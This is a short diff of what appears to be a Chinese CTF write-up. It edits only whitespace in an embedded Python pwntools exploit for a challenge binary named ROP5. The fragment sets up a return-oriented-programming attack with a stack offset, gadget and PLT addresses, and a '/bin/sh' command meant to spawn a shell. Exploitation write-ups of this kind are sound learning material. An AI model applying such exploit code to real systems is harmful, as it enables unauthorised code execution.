@@ -216,19 +216,21 @@ ida打开
 
 ```python
 #!/usr/bin/env python2
+
 # -*- coding: utf-8 -*-
+
 from pwn import *
 
 elf = ELF('ROP5')
 offset = 72
 read_plt = elf.plt['read']
 
-ppp_ret = 0x080485d9 				# ROPgadget --binary ROP5 --only "pop|ret" #esi edi ebp
-pop_ebp_ret = 0x080485db 
+ppp_ret = 0x080485d9 				# ROPgadget --binary ROP5 --only "pop|ret" #esi edi ebp 
+pop_ebp_ret = 0x080485db
 leave_ret = 0x08048458 				# ROPgadget --binary ROP5 --only "leave|ret"
 
 cmd = "/bin/sh"
-plt_0 = 0x08048380 					# objdump -d -j .plt ROP5
+plt_0 = 0x08048380 				# objdump -d -j .plt ROP5
 rel_plt = 0x08048330 				# objdump -s -j .rel.plt ROP5
 
 stack_size = 0x200
